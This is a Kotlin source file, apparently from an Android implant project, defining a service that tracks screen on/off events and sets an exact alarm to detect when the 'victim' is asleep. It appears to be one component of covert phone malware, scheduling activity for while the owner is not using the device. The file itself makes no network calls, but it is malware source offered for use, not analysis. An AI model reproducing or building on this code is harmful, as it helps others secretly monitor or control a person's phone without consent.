package com.cooperthecoder.implant

import android.app.AlarmManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import java.text.DateFormat
import java.util.*

class ScreenWatcherService : Service() {

    companion object {
        private val TAG = ScreenWatcherService::class.java.name
        private val REQUEST_CODE_SLEEP_ALARM = 1

        @JvmStatic val EXTRA_TIMESTAMP = "timestamp"
        @JvmStatic val EXTRA_SCREEN_STATE = "screen_state"
    }

    val alarmManager by lazy {
        getSystemService(Context.ALARM_SERVICE) as AlarmManager
    }
    var pendingIntent: PendingIntent? = null

    override fun onBind(intent: Intent): IBinder? {
        return null
    }

    override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {
        val screenState = intent.getStringExtra(EXTRA_SCREEN_STATE)
        val timestamp = intent.getLongExtra(EXTRA_TIMESTAMP, 0)
        updateScreenState(screenState, timestamp)
        when (screenState) {
            ScreenState.OFF -> {
                setAlarm()
            }
            ScreenState.ON -> {
                cancelAlarm()
            }
        }
        return START_NOT_STICKY
    }

    private fun cancelAlarm() {
        if (pendingIntent != null) {
            alarmManager.cancel(pendingIntent)
            Log.d(TAG, "User is awake. Alarm canceled.")
        }
    }

    private fun setAlarm() {
        val intent = Intent(this, SleepDetectingReceiver::class.java)
        val alarmTimeMillis = System.currentTimeMillis() + Config.VICTIM_SLEEPING_INTERVAL
        pendingIntent = PendingIntent.getBroadcast(applicationContext, REQUEST_CODE_SLEEP_ALARM, intent, PendingIntent.FLAG_ONE_SHOT)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            alarmManager.setExact(
                    AlarmManager.RTC_WAKEUP,
                    alarmTimeMillis,
                    pendingIntent
            )
        } else {
            alarmManager.set(
                    AlarmManager.RTC_WAKEUP,
                    alarmTimeMillis,
                    pendingIntent)
        }
        val alarmTime = formatDate(alarmTimeMillis)
        Log.d(TAG, "Alarm set for $alarmTime")
    }

    private fun formatDate(timeMillis: Long) = DateFormat.getDateTimeInstance().format(Date(timeMillis))

    private fun updateScreenState(screenState: String, timestamp: Long) {
        val prefs = getSharedPreferences(Config.SHARED_PREFERENCES_NAME, Context.MODE_PRIVATE).edit()
        prefs.putString(Config.PREFS_KEY_SCREEN_STATE, screenState)
                .putLong(Config.PREFS_KEY_STATE_TIMESTAMP, timestamp)
                .commit()

        val changeTime = formatDate(timestamp)
        Log.d(TAG, "Screen state changed at $changeTime to $screenState")
    }
}
